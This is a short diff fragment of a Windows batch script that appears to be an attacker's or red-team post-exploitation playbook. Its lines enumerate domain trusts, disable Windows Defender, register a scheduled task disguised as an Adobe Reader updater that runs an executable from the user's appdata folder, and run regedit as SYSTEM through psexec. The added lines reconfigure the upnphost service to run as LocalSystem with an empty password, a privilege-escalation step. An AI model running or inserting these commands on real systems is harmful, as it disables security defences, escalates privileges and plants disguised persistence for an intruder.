@@ -232,6 +232,8 @@ nltest /domain_trusts
 ECHO ============================
 sc config "windefend" start= disabled
 ECHO ============================
+sc config upnphost obj= ".\LocalSystem" password= ""
+ECHO ============================
 "schtasks" /Create /TR "CSIDL_PROFILE\appdata\roaming\adobe\adobeup.exe" /SC WEEKLY /TN "Adobe Acrobat Reader Updater"
 ECHO ============================
 psexec -s -i -d regedit
